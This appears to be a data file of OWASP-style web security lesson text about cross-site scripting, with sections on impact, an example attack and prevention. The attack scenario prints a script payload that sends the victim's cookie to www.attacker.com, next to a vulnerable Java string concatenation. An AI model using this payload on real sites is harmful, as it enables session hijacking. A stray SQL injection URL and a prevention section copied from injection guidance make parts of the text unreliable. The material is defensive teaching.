title=<h1 align="center">A3-Cross-Site Scripting (XSS)</h1>
description=<h2 align="center">A general description of the problem</h2>XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim\u2019s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.
impact=<h2 align="center">Outline typical impact of attacks exploiting that weakness</h2><p><b>Am I Vulnerable To 'Cross-Site Scripting (XSS)'?</b></p><p align="justify">You are vulnerable if you do not ensure that all user supplied input is properly escaped, or you do not verify it to be safe via input validation, before including that input in the output page. Without proper output escaping or validation, such input will be treated as active content in the browser. If Ajax is being used to dynamically update the page, are you using safe JavaScript APIs? For unsafe JavaScript APIs, encoding or validation must also be used.<br>Automated tools can find some XSS problems automatically. However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, making automated detection difficult. Therefore, complete coverage requires a combination of manual code review and penetration testing, in addition to automated approaches.<br>Web 2.0 technologies, such as Ajax, make XSS much more difficult to detect via automated tools.</p>
scenario=<h2 align="center">Example Attack Scenarios</h2><p>The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:</p><p><xmp>(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";</xmp></p><p>The attacker modifies the 'CC' parameter in their browser to:</p><p><xmp>'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi ?foo='+document.cookie</script>'.</xmp></p><p>This causes the victim\u2019s session ID to be sent to the attacker\u2019s website, allowing the attacker to hijack the user\u2019s current session.<br><br>Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See A8 for info on CSRF.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://example.com/app/accountView?id=' or '1'='1</p>
avoid=<h2 align="center">Outline how the weakness can be avoided</h2><p><b>How Do I Prevent 'Cross-Site Scripting (XSS)'?</b></p>Preventing injection requires keeping untrusted data separate from commands and queries. <ol><li>The preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface. Be careful with APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood.</li><li>If a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter. OWASP\u2019s ESAPI provides many of these escaping routines.</li><li>Positive or \u201cwhite list\u201d input validation is also recommended, but is not a complete defense as many applications require special characters in their input. If special characters are required, only approaches 1. and 2. above will make their use safe. OWASP\u2019s ESAPI has an extensible library of white list input validation routines.</li></ol>
external_resources=<h2 align="center">Links to external resources for further information</h2><ul><li><a href="http://cwe.mitre.org/data/definitions/79.html">CWE Entry 79 on Cross-Site Scripting</a></li></ul> 